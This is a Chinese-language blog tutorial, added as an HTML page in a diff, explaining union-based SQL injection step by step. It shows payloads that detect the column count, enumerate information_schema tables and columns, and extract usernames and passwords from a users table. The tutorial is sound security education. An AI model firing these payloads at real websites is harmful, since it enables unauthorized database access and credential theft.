@@ -1,0 +1,773 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/icon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="kitescat">
+  <meta name="keywords" content="web安全">
+  
+    <meta name="description" content="基于Union连接语句实现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Sql注入】联合注入">
+<meta property="og:url" content="https://kitescat.github.io/2023/04/24/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="kitescat 的博客">
+<meta property="og:description" content="基于Union连接语句实现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kitescat.github.io/img/union_inj.png">
+<meta property="article:published_time" content="2023-04-24T03:48:04.000Z">
+<meta property="article:modified_time" content="2024-03-02T09:05:34.864Z">
+<meta property="article:author" content="kitescat">
+<meta property="article:tag" content="渗透测试，SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kitescat.github.io/img/union_inj.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>【Sql注入】联合注入 - kitescat 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kitescat.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Bdvwiy7o0pH7cQqR3w5tSkwq-gzGzoHsz","app_key":"F1k0q0hNrqIoyqh5dgzVHVYi","server_url":null,"path":"window.location.pathname","ignore_local":false,"security":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>kitescat&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/union_inj.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【Sql注入】联合注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-24 11:48" pubdate>
+          2023年4月24日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【Sql注入】联合注入</h1>
+            
+            <div class="markdown-body">
+              
+              <div class="note note-info">
+            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>
+          </div>
+
+<h1 id="联合注入：基于Union的注入"><a href="#联合注入：基于Union的注入" class="headerlink" title="联合注入：基于Union的注入"></a>联合注入：基于Union的注入</h1><h2 id="sql注入漏洞概述"><a href="#sql注入漏洞概述" class="headerlink" title="sql注入漏洞概述"></a>sql注入漏洞概述</h2><p>本篇我们即将开启Web安全基础学习之旅，从我所整理的笔记中梳理常见Web漏洞的诸多知识点，包括漏洞原理，分类，利用场景及手段，渗透测试步骤，防御措施及常用工具等多个角度。</p>
+<p>首先，sql注入原理：存在输入口，使得用户输入的恶意sql语句拼接到正常语句中被后台执行。</p>
+<h2 id="1-联合注入-基于Union的注入"><a href="#1-联合注入-基于Union的注入" class="headerlink" title="1 联合注入(基于Union的注入)"></a>1 联合注入(基于Union的注入)</h2><p>上一篇我们已经总结了报错注入的知识点，报错注入是注入页面可显示数据库报错结果的情况下，利用函数报错使其输出错误结果来获取数据库的相关信息的一种sql注入类型。其可以分为数据溢出报错(exp,~)，xpath语法报错(extractvalue/updatexml)，主键重复报错（count()、rand()、group by组合），列名重复报错（NAME_CONST/const/join），几何函数报错。</p>
+<p>本篇我们集中介绍联合注入，即基于Union的注入。</p>
+<p>select username from user union select userid from user;<br>大致就是这样，显然union会一次显示两个查询结果<br>Union注入可利用的前提是页面上有显示位。服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，当页面对不同的查询语句有不同的结果时可以使用。</p>
+<h2 id="2-注入步骤及漏洞利用"><a href="#2-注入步骤及漏洞利用" class="headerlink" title="2 注入步骤及漏洞利用"></a>2 注入步骤及漏洞利用</h2><p>① 找注入点<br>如果要对一个网站进行SQL注入攻击，首先就需要找到存在SQL注入漏洞的地方，也就是寻找所谓的注入点。可能的SQL注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地方，如表单中的输入域 URL的参数 Cookie或者隐藏域。<br>可能的注入点细节我们后面慢慢整理与补充。<br>　　最常用的寻找SQL注入点的方法，是在网站中寻找如下形式的页面链接：<a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a>     (此处参数存在的文件后缀可为.asp/php/html/…)。其中“YY”可能是数字，也有可能是字符串，分别被称为整数类型数据或者字符型数据。<br>Tips: 那么我们如何快速查找某个网站存在的sql注入点呢？此处挖坑。<br>② 判断注入类型</p>
+<p>我们在可能存在SQL注入变量的后边添加以下payload：</p>
+<p>and 1=1 / and 1=2 回显页面不同(数字型判断) </p>
+<p>单引号‘  双引号” 判断 显示数据库错误信息或者页面回显不同(字符串类型判断) </p>
+<p>-1/+1 回显下一个或上一个页面(数字型判断)</p>
+<p>③ 判断查询列数<br>猜解列数：order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序。<br><img src="/img/col_guess.png" srcset="/img/loading.gif" lazyload><br>第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数。输入 order by 4%23  发现页面错误，说明没有4列。输入3列时，页面正常，说明有3列。<br>④  判断显示位<br>‘ union select 1 –+<br>‘ union select 1,2 –+<br>‘ union select 1,2,3 –+<br>这一步的作用是：判断显示位，因为我们不知道显示位是在1，2还是3<br><img src="/img/place_guess.png" srcset="/img/loading.gif" lazyload><br>UNION的作用是将两个select查询结果合并。union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。于是我们可以设置id=-1 使得union后边显示出来。<br>即：?id=-1’ union select 1,2,3–+<br>⑤ 获取所有数据库名<br>获得当前数据库及用户信息：<br>‘ union select 1,version(), database() –<br>‘ union select 1,user(), database() –<br>version() 获得数据库版本信息，database() 获得当前数据库名，user() 获得当前用户名。<br>此时这些信息会显示到界面。</p>
+<p>⑥ 获取表名<br>查询数据库中的所有表：<br>‘ union select * from information_schema.tables –+<br>查询所有库名：<br>‘ union select table_schema, 1 from information_schema.tables –+<br>查询数据库中的所有表名：<br>‘union select table_name, 1 from information_schema.tables –+<br>同时查询表名及对应库名：<br>‘ union select table_name, table_schema from information_schema.tables –+<br>查询数据表中的列名：<br>‘union select column_name, 1 from information_schema.columns<br>where table_name = ‘users’ –+<br>查询数据列：’ union select 1, user from users –+<br>?id=-1′ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+<br>?id=-1′ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’),3–+<br>?id=-1′ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3–+<br>?id=0’ union select 1,username,password from users limit 1,1–+<br>使用limit控制，一行行获取数据<br> select * from tableName limit i,n<br> tableName：表名<br> i：为查询结果的索引值(默认从0开始)，当i=0时可省略i<br> n：为查询结果返回的数量<br>如果想查询的字段比union前面固定的字段要多，就要使用concat来合并：<br>‘ union select password, concat(first_name,’ ‘,last_name,’ ‘,user) from users –+ </p>
+<h2 id="3-解答"><a href="#3-解答" class="headerlink" title="3 解答"></a>3 解答</h2><p>① 为什么是select 1，2 不是 select 1，2，3？<br>union：同时执行两条查询语句。所以必须保证两条查询语句的列数保持一致。这也是为什么我们要先确定列数，才能继续union注入。</p>
+<p>select id,username,password from user union select 1,2,3;<br>② –+  #  %23代表什么？<br>– （注意–后面带一个空格），#代表注释，%23是#的url编码形式，因此等同。<br>由于在传输过程中空格会被忽略，同样导致无法注释，所以用+代替空格。<br>为了注释后面的语句使得sql语句提前闭合，所以需要加入注释符号。<br>③ information_schema是什么？（待补充细节）<br>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p>
+<p>table_name：表的名称   </p>
+<p>information_schema.tables 获取所有数据库</p>
+<p>column_name：列的名称 </p>
+<p>information_schema.columns</p>
+<p>information_schema.schemata：mysql实例中所有数据库的信息。</p>
+<p>show databases的结果取于此表。</p>
+<p>④  如何快速查找某个网站存在的sql注入点呢？<br>可以参考 github项目：<br><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/SleuthQL">https://github.com/ianxtianxt/SleuthQL</a> </p>
+<p>我们之后的文章也探讨下这个问题。</p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>本篇我们讲解了sql注入漏洞的联合注入，基于Union的注入关键词有：有显示位，查询列数需要相同，要判断列数。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.haochen1204.com/2021/03/21/sql-zhu-ru-zhi-lian-he-zhu-ru/">https://www.haochen1204.com/2021/03/21/sql-zhu-ru-zhi-lian-he-zhu-ru/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2088168">https://cloud.tencent.com/developer/article/2088168</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1196791">https://cloud.tencent.com/developer/article/1196791</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/SleuthQL">https://github.com/ianxtianxt/SleuthQL</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024?spm=1001.2014.3001.5506">https://blog.csdn.net/hxhxhxhxx/article/details/107643024?spm=1001.2014.3001.5506</a></p>
+<p>声明：本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。所有内容仅作为学习记录。请遵守中华人民共和国法律！</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/">#渗透测试，SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【Sql注入】联合注入</div>
+      <div>https://kitescat.github.io/2023/04/24/SQL注入之联合注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>kitescat</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月24日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/" title="【Sql注入】盲注">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【Sql注入】盲注</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="【Sql注入】报错注入">
+                        <span class="hidden-mobile">【Sql注入】报错注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
